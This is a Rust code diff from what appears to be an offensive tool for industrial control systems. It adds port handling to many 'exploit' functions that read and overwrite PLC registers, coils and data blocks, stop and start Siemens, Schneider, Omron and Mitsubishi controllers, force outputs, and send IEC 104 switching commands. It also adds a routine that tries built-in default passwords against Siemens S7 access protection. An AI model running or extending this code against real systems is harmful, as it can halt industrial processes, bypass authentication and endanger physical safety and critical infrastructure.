+    out(&format!("[*] Writing outputs '{args}' to {ip}:{port}..."));
+    if s7comm::set_outputs(ip, args, port, 5, None) {
         out("[+] Outputs written");
-    } else if s7comm::probe_auth_required(ip, 102, 5) {
+    } else if s7comm::probe_auth_required(ip, port, 5) {
         out("[-] Access denied — retry via CLI with --password");
     } else {
         out("[-] Write failed");
     }
 }
 
-fn exploit_siemens_set_merkers(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_set_merkers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
+    let port = if port == 0 { 102 } else { port };
     let args = input.trim();
     let (bits, offset_s) = args.split_once(':').unwrap_or((args, "0"));
     let offset = offset_s.trim().parse::<u32>().unwrap_or(0);
-    out(&format!("[*] Writing merkers '{bits}' at offset {offset} to {ip}..."));
-    if s7comm::set_merkers(ip, bits, offset, 102, 5, None) {
+    out(&format!("[*] Writing merkers '{bits}' at offset {offset} to {ip}:{port}..."));
+    if s7comm::set_merkers(ip, bits, offset, port, 5, None) {
         out("[+] Merkers written");
-    } else if s7comm::probe_auth_required(ip, 102, 5) {
+    } else if s7comm::probe_auth_required(ip, port, 5) {
         out("[-] Access denied — retry via CLI with --password");
     } else {
         out("[-] Write failed");
     }
 }
 
-fn exploit_siemens_list_dbs(ip: &str, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_list_dbs(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
-    out(&format!("[*] Scanning DB1..200 on {ip} (may take a moment)..."));
-    let blocks = s7comm::list_data_blocks(ip, 102, 5, None);
+    let port = if port == 0 { 102 } else { port };
+    out(&format!("[*] Scanning DB1..200 on {ip}:{port} (may take a moment)..."));
+    let blocks = s7comm::list_data_blocks(ip, port, 5, None);
     if blocks.is_empty() {
-        if s7comm::probe_auth_required(ip, 102, 5) {
+        if s7comm::probe_auth_required(ip, port, 5) {
             out("[-] Access denied — retry via CLI with --password");
         } else {
             out("[-] No readable data blocks found");
@@ -1295,16 +1325,17 @@ fn exploit_siemens_list_dbs(ip: &str, _input: &str, out: &impl Fn(&str)) {
     out(&format!("[+] {} data block(s) found", blocks.len()));
 }
 
-fn exploit_siemens_read_db(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_read_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
+    let port = if port == 0 { 102 } else { port };
     let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
     let db_str = parts.first().copied().unwrap_or("DB1");
     let db_num = db_str.trim_start_matches(|c: char| c.is_alphabetic())
         .parse::<u16>().unwrap_or(1);
     let offset = parts.get(1).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
     let length = parts.get(2).and_then(|s| s.parse::<u16>().ok()).unwrap_or(64).min(240);
-    out(&format!("[*] Reading DB{db_num} offset={offset} len={length} from {ip}..."));
-    match s7comm::read_data_block(ip, db_num, offset, length, 102, 5, None) {
+    out(&format!("[*] Reading DB{db_num} offset={offset} len={length} from {ip}:{port}..."));
+    match s7comm::read_data_block(ip, db_num, offset, length, port, 5, None) {
         Ok(data) => {
             for line in hex_dump_lines(&data, offset) {
                 out(&line);
@@ -1312,7 +1343,7 @@ fn exploit_siemens_read_db(ip: &str, input: &str, out: &impl Fn(&str)) {
             out(&format!("[+] {} bytes", data.len()));
         }
         Err(e) => {
-            if s7comm::probe_auth_required(ip, 102, 5) {
+            if s7comm::probe_auth_required(ip, port, 5) {
                 out("[-] Access denied — retry via CLI with --password");
             } else {
                 out(&format!("[-] {e}"));
@@ -1334,13 +1365,13 @@ fn hex_dump_lines(data: &[u8], base_offset: u16) -> Vec<String> {
 
 // ─── New Schneider/Modbus exploits ───────────────────────────────────────────
 
-fn exploit_modbus_holding(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_modbus_holding(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modbus;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
     out(&format!("[*] Reading {count} holding registers from {ip} (start={start})..."));
-    match modbus::read_holding_registers(ip, start, count) {
+    match modbus::read_holding_registers(ip, port, start, count) {
         Ok(regs) => {
             let [hdr, sep] = modbus_header();
             out(&hdr); out(&sep);
@@ -1357,13 +1388,13 @@ fn exploit_modbus_holding(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_modbus_coils(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_modbus_coils(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modbus;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
     out(&format!("[*] Reading {count} coils from {ip} (start={start})..."));
-    match modbus::read_coils(ip, start, count) {
+    match modbus::read_coils(ip, port, start, count) {
         Ok(regs) => {
             let [hdr, sep] = modbus_header();
             out(&hdr); out(&sep);
@@ -1380,13 +1411,13 @@ fn exploit_modbus_coils(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_modbus_input(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_modbus_input(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modbus;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
     out(&format!("[*] Reading {count} input registers from {ip} (start={start})..."));
-    match modbus::read_input_registers(ip, start, count) {
+    match modbus::read_input_registers(ip, port, start, count) {
         Ok(regs) => {
             let [hdr, sep] = modbus_header();
             out(&hdr); out(&sep);
@@ -1405,20 +1436,20 @@ fn exploit_modbus_input(ip: &str, input: &str, out: &impl Fn(&str)) {
 
 // ─── New Phoenix exploits ────────────────────────────────────────────────────
 
-fn exploit_phoenix_control_ilc150(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_phoenix_control_ilc150(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::phoenix::control;
     let (action, start_type) = input.split_once(':').unwrap_or((input, "cold"));
     out(&format!("[*] Sending ILC150 '{action}' command to {ip}..."));
-    match control::control_ilc150(ip, action, start_type) {
+    match control::control_ilc150(ip, port, action, start_type) {
         Ok(state) => out(&format!("[+] PLC state: {state}")),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_phoenix_control_ilc390(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_phoenix_control_ilc390(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::phoenix::control;
     out(&format!("[*] Sending ILC390 '{input}' command to {ip}..."));
-    match control::control_ilc390(ip, input) {
+    match control::control_ilc390(ip, port, input) {
         Ok(state) => out(&format!("[+] PLC state: {state}")),
         Err(e) => out(&format!("[-] {e}")),
     }
@@ -1442,14 +1473,14 @@ fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_mitsubishi_read_d(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_mitsubishi_read_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::mitsubishi::slmp;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "50"));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(50).min(960);
     let end = start.saturating_add(count as u32).saturating_sub(1);
     out(&format!("[*] Reading D{start}..D{end} from {ip}..."));
-    match slmp::read_word_devices(ip, "D", start, count) {
+    match slmp::read_word_devices(ip, port, "D", start, count) {
         Ok(vals) => {
             let [hdr, sep] = slmp_header();
             out(&hdr); out(&sep);
@@ -1466,14 +1497,14 @@ fn exploit_mitsubishi_read_d(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_mitsubishi_read_m(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_mitsubishi_read_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::mitsubishi::slmp;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(64).min(3584);
     let end = start.saturating_add(count as u32).saturating_sub(1);
     out(&format!("[*] Reading M{start}..M{end} from {ip}..."));
-    match slmp::read_bit_devices(ip, "M", start, count) {
+    match slmp::read_bit_devices(ip, port, "M", start, count) {
         Ok(vals) => {
             let [hdr, sep] = slmp_header();
             out(&hdr); out(&sep);
@@ -1492,31 +1523,31 @@ fn exploit_mitsubishi_read_m(ip: &str, input: &str, out: &impl Fn(&str)) {
 
 // ─── Modbus write exploits ────────────────────────────────────────────────────
 
-fn exploit_modbus_write_coil(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_modbus_write_coil(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modbus;
     let (addr_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
     let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
     let on = !state_s.trim().eq_ignore_ascii_case("off");
     out(&format!("[*] Writing coil {addr} = {} on {ip}...", if on { "ON" } else { "OFF" }));
-    match modbus::write_single_coil(ip, addr, on) {
+    match modbus::write_single_coil(ip, port, addr, on) {
         Ok(()) => out(&format!("[+] Coil {addr} written")),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_modbus_write_register(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_modbus_write_register(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modbus;
     let (addr_s, val_s) = input.split_once(':').unwrap_or((input, "0"));
     let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
     let value = val_s.trim().parse::<u16>().unwrap_or(0);
     out(&format!("[*] Writing register {addr} = {value} on {ip}..."));
-    match modbus::write_single_register(ip, addr, value) {
+    match modbus::write_single_register(ip, port, addr, value) {
         Ok(()) => out(&format!("[+] Register {addr} written")),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_modbus_write_registers(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_modbus_write_registers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modbus;
     let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
@@ -1529,7 +1560,7 @@ fn exploit_modbus_write_registers(ip: &str, input: &str, out: &impl Fn(&str)) {
         return;
     }
     out(&format!("[*] Writing {} registers starting at {start} on {ip}...", values.len()));
-    match modbus::write_multiple_registers(ip, start, &values) {
+    match modbus::write_multiple_registers(ip, port, start, &values) {
         Ok(n) => out(&format!("[+] {n} register(s) written")),
         Err(e) => out(&format!("[-] {e}")),
     }
@@ -1537,47 +1568,47 @@ fn exploit_modbus_write_registers(ip: &str, input: &str, out: &impl Fn(&str)) {
 
 // ─── Schneider FC90 exploits ──────────────────────────────────────────────────
 
-fn exploit_fc90_stop(ip: &str, out: &impl Fn(&str)) {
+fn exploit_fc90_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modicon_fc90;
     out(&format!("[*] FC90 STOP command to {ip} (M340/Quantum/Premium)..."));
-    match modicon_fc90::stop_plc(ip) {
+    match modicon_fc90::stop_plc(ip, port) {
         Ok(true) => out("[+] PLC stopped (ack received)"),
         Ok(false) => out("[!] Command sent — no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_fc90_start(ip: &str, out: &impl Fn(&str)) {
+fn exploit_fc90_start(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modicon_fc90;
     out(&format!("[*] FC90 START command to {ip} (M340/Quantum/Premium)..."));
-    match modicon_fc90::start_plc(ip) {
+    match modicon_fc90::start_plc(ip, port) {
         Ok(true) => out("[+] PLC started (ack received)"),
         Ok(false) => out("[!] Command sent — no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_fc90_stop_tm221(ip: &str, out: &impl Fn(&str)) {
+fn exploit_fc90_stop_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modicon_fc90;
     out(&format!("[*] FC90 STOP TM221 to {ip}..."));
-    match modicon_fc90::stop_tm221(ip) {
+    match modicon_fc90::stop_tm221(ip, port) {
         Ok(true) => out("[+] TM221 stopped"),
         Ok(false) => out("[!] Command sent — no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_fc90_start_tm221(ip: &str, out: &impl Fn(&str)) {
+fn exploit_fc90_start_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modicon_fc90;
     out(&format!("[*] FC90 START TM221 to {ip}..."));
-    match modicon_fc90::start_tm221(ip) {
+    match modicon_fc90::start_tm221(ip, port) {
         Ok(true) => out("[+] TM221 started"),
         Ok(false) => out("[!] Command sent — no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_fc90_force(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_fc90_force(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::modicon_fc90::{self, ForceState};
     let (byte_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
     let output_byte = u8::from_str_radix(byte_s.trim().trim_start_matches("0x"), 16)
@@ -1588,7 +1619,7 @@ fn exploit_fc90_force(ip: &str, input: &str, out: &impl Fn(&str)) {
         _ => ForceState::On,
     };
     out(&format!("[*] FC90 Force output 0x{output_byte:02x} to {state_s} on {ip}..."));
-    match modicon_fc90::force_output_bit(ip, output_byte, state) {
+    match modicon_fc90::force_output_bit(ip, port, output_byte, state) {
         Ok(true) => out("[+] Force command sent"),
         Ok(false) => out("[!] Command sent — no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
@@ -1597,7 +1628,7 @@ fn exploit_fc90_force(ip: &str, input: &str, out: &impl Fn(&str)) {
 
 // ─── SLMP write exploits ──────────────────────────────────────────────────────
 
-fn exploit_slmp_write_d(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_slmp_write_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::mitsubishi::slmp;
     let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
@@ -1610,13 +1641,13 @@ fn exploit_slmp_write_d(ip: &str, input: &str, out: &impl Fn(&str)) {
         return;
     }
     out(&format!("[*] Writing {} D registers starting at D{start} on {ip}...", values.len()));
-    match slmp::write_word_devices(ip, "D", start, &values) {
+    match slmp::write_word_devices(ip, port, "D", start, &values) {
         Ok(()) => out("[+] D registers written"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_slmp_write_m(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_slmp_write_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::mitsubishi::slmp;
     let (start_s, bits_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u32>().unwrap_or(0);
@@ -1634,7 +1665,7 @@ fn exploit_slmp_write_m(ip: &str, input: &str, out: &impl Fn(&str)) {
         return;
     }
     out(&format!("[*] Writing {} M bits starting at M{start} on {ip}...", values.len()));
-    match slmp::write_bit_devices(ip, "M", start, &values) {
+    match slmp::write_bit_devices(ip, port, "M", start, &values) {
         Ok(()) => out("[+] M bits written"),
         Err(e) => out(&format!("[-] {e}")),
     }
@@ -1642,8 +1673,9 @@ fn exploit_slmp_write_m(ip: &str, input: &str, out: &impl Fn(&str)) {
 
 // ─── Siemens DB write exploit ─────────────────────────────────────────────────
 
-fn exploit_siemens_write_db(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_write_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
+    let port = if port == 0 { 102 } else { port };
     let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
     let db_str = parts.first().copied().unwrap_or("DB1");
     let db_num = db_str.trim_start_matches(|c: char| c.is_alphabetic())
@@ -1657,12 +1689,12 @@ fn exploit_siemens_write_db(ip: &str, input: &str, out: &impl Fn(&str)) {
         out("[-] No data to write (format: DB1:offset:hexbytes)");
         return;
     }
-    out(&format!("[*] Writing {} byte(s) to DB{db_num}:{offset} on {ip}...", data.len()));
-    match s7comm::write_data_block(ip, db_num, offset, &data, 102, 5, None) {
+    out(&format!("[*] Writing {} byte(s) to DB{db_num}:{offset} on {ip}:{port}...", data.len()));
+    match s7comm::write_data_block(ip, db_num, offset, &data, port, 5, None) {
         Ok(true) => out("[+] DB write acknowledged"),
         Ok(false) => out("[!] Write sent — PLC did not acknowledge"),
         Err(e) => {
-            if s7comm::probe_auth_required(ip, 102, 5) {
+            if s7comm::probe_auth_required(ip, port, 5) {
                 out("[-] Access denied — retry via CLI with --password");
             } else {
                 out(&format!("[-] {e}"));
@@ -1671,9 +1703,41 @@ fn exploit_siemens_write_db(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
+fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
+    use crate::vendors::siemens::s7comm;
+    use crate::vendors::default_creds;
+    use crate::creds;
+    let port = if port == 0 { 102 } else { port };
+    out(&format!("[*] Probing {ip}:{port} for S7Comm access protection..."));
+    if !s7comm::probe_auth_required(ip, port, 5) {
+        out("[*] No access protection detected — no password needed");
+        return;
+    }
+    out("[!] Access protection active — trying passwords...");
+    let loaded = creds::load();
+    let all_passwords: Vec<&str> = loaded.siemens.passwords.iter().map(|s| s.as_str())
+        .chain(default_creds::SIEMENS_S7_PASSWORDS.iter().copied())
+        .collect();
+    if !loaded.siemens.passwords.is_empty() {
+        out(&format!("[*] {} user-supplied + {} built-in passwords",
+            loaded.siemens.passwords.len(), default_creds::SIEMENS_S7_PASSWORDS.len()));
+    }
+    for &pw in &all_passwords {
+        let display = if pw.is_empty() { "(empty)" } else { pw };
+        let state = s7comm::get_cpu_state(ip, port, 5, Some(pw));
+        if state != "Unknown" {
+            out(&format!("[+] Password accepted: \"{display}\""));
+            out(&format!("    CPU State: {state}"));
+            return;
+        }
+    }
+    out(&format!("[-] None of the {} passwords worked", all_passwords.len()));
+    out("    Add custom passwords to ~/.config/scadaver/creds.toml [siemens] section");
+}
+
 // ─── Beckhoff write symbol exploit ───────────────────────────────────────────
 
-fn exploit_beckhoff_write_symbol(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_beckhoff_write_symbol(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     let (sym_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
@@ -1692,7 +1756,7 @@ fn exploit_beckhoff_write_symbol(ip: &str, input: &str, out: &impl Fn(&str)) {
         return;
     };
     out(&format!("[*] Writing symbol '{sym_name}' ({} bytes)...", value_bytes.len()));
-    match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes) {
+    match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
         Ok(true) => out("[+] Symbol written"),
         Ok(false) => out("[!] Write sent — ADS error code returned"),
         Err(e) => out(&format!("[-] {e}")),
@@ -1701,10 +1765,10 @@ fn exploit_beckhoff_write_symbol(ip: &str, input: &str, out: &impl Fn(&str)) {
 
 // ─── Omron FINS exploits ──────────────────────────────────────────────────────
 
-fn exploit_omron_info(ip: &str, out: &impl Fn(&str)) {
+fn exploit_omron_info(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::omron::fins;
     out(&format!("[*] Getting Omron device info from {ip}..."));
-    match fins::get_device_info_tcp(ip) {
+    match fins::get_device_info_tcp(ip, port) {
         Ok(dev) => {
             out(&format!("  Model:    {}", dev.model));
             out(&format!("  Version:  {}", dev.version));
@@ -1715,13 +1779,13 @@ fn exploit_omron_info(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_omron_read_dm(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_omron_read_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::omron::fins;
     let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "10"));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
     let count = count_s.trim().parse::<u16>().unwrap_or(10).min(100);
     out(&format!("[*] Reading DM{start}..DM{} from {ip}...", start + count - 1));
-    match fins::read_dm_words(ip, 0, start, count) {
+    match fins::read_dm_words(ip, port, 0, start, count) {
         Ok(vals) => {
             out(&format!("  {:<8}  {:<8}  {}", "Address", "Dec", "Hex"));
             out(&format!("  {:─<8}  {:─<8}  {:─<6}", "", "", ""));
@@ -1734,7 +1798,7 @@ fn exploit_omron_read_dm(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_omron_write_dm(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_omron_write_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::omron::fins;
     let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
     let start = start_s.trim().parse::<u16>().unwrap_or(0);
@@ -1747,35 +1811,35 @@ fn exploit_omron_write_dm(ip: &str, input: &str, out: &impl Fn(&str)) {
         return;
     }
     out(&format!("[*] Writing {} DM word(s) at DM{start} on {ip}...", values.len()));
-    match fins::write_dm_words(ip, 0, start, &values) {
+    match fins::write_dm_words(ip, port, 0, start, &values) {
         Ok(()) => out("[+] DM words written"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_omron_cpu_status(ip: &str, out: &impl Fn(&str)) {
+fn exploit_omron_cpu_status(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::omron::fins;
     out(&format!("[*] Reading CPU status from {ip}..."));
-    match fins::get_cpu_state(ip, 0) {
+    match fins::get_cpu_state(ip, port, 0) {
         Ok(state) => out(&format!("[+] CPU State: {state}")),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_omron_cpu_run(ip: &str, out: &impl Fn(&str)) {
+fn exploit_omron_cpu_run(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::omron::fins;
     out(&format!("[*] Setting Omron CPU to RUN (Monitor mode) on {ip}..."));
-    match fins::set_cpu_mode(ip, 0, true) {
+    match fins::set_cpu_mode(ip, port, 0, true) {
         Ok(true) => out("[+] CPU set to Monitor/Run mode"),
         Ok(false) => out("[!] Command sent — FINS error returned"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_omron_cpu_stop(ip: &str, out: &impl Fn(&str)) {
+fn exploit_omron_cpu_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::omron::fins;
     out(&format!("[*] Setting Omron CPU to STOP on {ip}..."));
-    match fins::set_cpu_mode(ip, 0, false) {
+    match fins::set_cpu_mode(ip, port, 0, false) {
         Ok(true) => out("[+] CPU stopped"),
         Ok(false) => out("[!] Command sent — FINS error returned"),
         Err(e) => out(&format!("[-] {e}")),
@@ -1784,10 +1848,10 @@ fn exploit_omron_cpu_stop(ip: &str, out: &impl Fn(&str)) {
 
 // ─── IEC 60870-5-104 exploits ─────────────────────────────────────────────────
 
-fn exploit_iec104_gi(ip: &str, out: &impl Fn(&str)) {
+fn exploit_iec104_gi(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::iec104::client;
     out(&format!("[*] IEC 104 General Interrogation to {ip}..."));
-    match client::connect(ip) {
+    match client::connect(ip, port) {
         Ok(mut sess) => {
             out("[+] STARTDT confirmed");
             match client::general_interrogation(&mut sess) {
@@ -1804,11 +1868,11 @@ fn exploit_iec104_gi(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_iec104_sc_on(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_iec104_sc_on(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::iec104::client;
     let ioa = input.trim().parse::<u32>().unwrap_or(1);
     out(&format!("[*] IEC 104 Single Command ON to IOA {ioa} on {ip}..."));
-    match client::connect(ip) {
+    match client::connect(ip, port) {
         Ok(mut sess) => match client::single_command(&mut sess, ioa, true) {
             Ok(true) => out("[+] Single Command ON confirmed"),
             Ok(false) => out("[!] Command sent — negative confirmation"),
@@ -1818,11 +1882,11 @@ fn exploit_iec104_sc_on(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_iec104_sc_off(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_iec104_sc_off(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::iec104::client;
     let ioa = input.trim().parse::<u32>().unwrap_or(1);
     out(&format!("[*] IEC 104 Single Command OFF to IOA {ioa} on {ip}..."));
-    match client::connect(ip) {
+    match client::connect(ip, port) {
         Ok(mut sess) => match client::single_command(&mut sess, ioa, false) {
             Ok(true) => out("[+] Single Command OFF confirmed"),
             Ok(false) => out("[!] Command sent — negative confirmation"),
@@ -1832,14 +1896,14 @@ fn exploit_iec104_sc_off(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_iec104_dc(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_iec104_dc(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::iec104::client;
     let (ioa_s, state_s) = input.split_once(':').unwrap_or((input, "2"));
     let ioa = ioa_s.trim().parse::<u32>().unwrap_or(1);
     let state = state_s.trim().parse::<u8>().unwrap_or(2).clamp(1, 3);
     let state_name = match state { 1 => "OFF", 2 => "ON", _ => "INDETERMINATE" };
     out(&format!("[*] IEC 104 Double Command IOA {ioa} state={state_name} on {ip}..."));
-    match client::connect(ip) {
+    match client::connect(ip, port) {
         Ok(mut sess) => match client::double_command(&mut sess, ioa, state) {
             Ok(true) => out("[+] Double Command confirmed"),
             Ok(false) => out("[!] Command sent — negative confirmation"),
@@ -1870,6 +1934,7 @@ fn draw(frame: &mut Frame, app: &mut App) {
         Mode::ScanMenu => draw_scan_menu(frame, size, app),
         Mode::Help => draw_help(frame, size),
         Mode::ExploitInput => draw_exploit_input_popup(frame, size, app),
+        Mode::VendorPicker => draw_vendor_picker(frame, size, app),
         _ => {}
     }
 
@@ -1889,7 +1954,7 @@ fn draw_header(frame: &mut Frame, area: Rect, app: &App) {
         Mode::Normal =>
             " [A] Add IP  [S] Scan  [E] Exploit  [R] Rescan  [D] Delete  [/] Search  [O] Zoom  [C] Clear output  [?] Help  [Q] Quit",
         Mode::IpInput => " Enter IP address \u{2014} [ESC] cancel",
-        Mode::ExploitMenu => " [J/K] Navigate  [ENTER] Run  [O] Zoom output  [PgUp/PgDn] Scroll  [ESC] back",
+        Mode::ExploitMenu => " [J/K] Navigate  [ENTER] Run  [V] View as protocol  [O] Zoom  [PgUp/PgDn] Scroll  [ESC] back",
         Mode::Search => " Type to filter \u{2014} [ESC] clear  [ENTER] confirm",
         Mode::ExploitInput => " Enter parameter \u{2014} [ENTER] run  [ESC] cancel",
         Mode::OutputZoom => " [J/K/PgUp/PgDn] Scroll  [G] Bottom  [g] Top  [C] Clear  [O/ESC] Close",
@@ -2039,7 +2104,19 @@ fn draw_exploit_menu(frame: &mut Frame, area: Rect, app: &App) {
         .split(area);
 
     let vendor = app.selected_vendor().unwrap_or_default();
-    let title = format!(" Exploits \u{2014} {} ", vendor.to_uppercase());
+    let port_label = {
+        let p = app.device_port(0);
+        if p == 0 { String::new() } else { format!(" :{p}") }
+    };
+    let title = match &app.vendor_override {
+        None => format!(" Exploits \u{2014} {}{port_label} ", vendor.to_uppercase()),
+        Some(ov) => {
+            let stored = app.selected_device()
+                .map(|d| d.vendor.to_uppercase())
+                .unwrap_or_default();
+            format!(" Exploits \u{2014} {stored} [as {}]{port_label} ", ov.to_uppercase())
+        }
+    };
 
     let items: Vec<ListItem> = app
         .exploit_defs
@@ -2268,6 +2345,7 @@ fn draw_help(frame: &mut Frame, area: Rect) {
         Line::from(Span::styled(" Exploit Menu", s.fg(Color::Cyan).add_modifier(Modifier::BOLD))),
         Line::from(Span::styled("  J/K      Navigate exploit list", s.fg(Color::White))),
         Line::from(Span::styled("  ENTER    Run selected exploit", s.fg(Color::White))),
+        Line::from(Span::styled("  V        View as a different protocol", s.fg(Color::White))),
         Line::from(Span::styled("  Yellow   Exploit requires input parameter", s.fg(Color::Yellow))),
         Line::from(""),
         Line::from(Span::styled(" Output", s.fg(Color::Cyan).add_modifier(Modifier::BOLD))),
@@ -2350,6 +2428,7 @@ fn handle_key(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -
         Mode::ScanMenu => { handle_scan_menu(app, code); false }
         Mode::ExploitMenu => { handle_exploit_menu(app, code); false }
         Mode::ExploitInput => { handle_exploit_input(app, code); false }
+        Mode::VendorPicker => { handle_vendor_picker(app, code); false }
         Mode::Search => { handle_search(app, code); false }
         Mode::Help => { app.mode = Mode::Normal; false }
         Mode::OutputZoom => { handle_output_zoom(app, code, mods); false }
